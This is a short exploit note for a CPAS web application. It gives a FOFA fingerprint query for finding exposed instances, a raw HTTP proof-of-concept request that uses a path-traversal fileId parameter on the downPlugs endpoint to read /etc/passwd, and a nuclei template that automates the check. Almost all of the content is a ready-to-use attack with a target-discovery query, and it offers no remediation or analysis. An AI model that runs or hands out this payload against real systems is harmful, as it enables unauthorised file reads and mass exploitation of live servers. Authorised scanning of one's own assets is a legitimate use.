# fofa

```plain
icon_hash="-58141038"
```

# POC

```http
GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName= HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

# nuclei

```yaml
id: CPAS-downloadfile

info:
  name: CPAS-downloadfile
  author: zxf
  severity: high
  metadata:
    fofasearch: icon_hash="-58141038"

http:
  - raw:
      - |
        GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName= HTTP/1.1
        Host: 
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        
    matchers:
          - type: dsl
            dsl:
              - status_code==200 && contains_all(body,"root:")
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739185789669-dbd957f8-f7a0-4ae7-a574-8aa41971aef5.png)

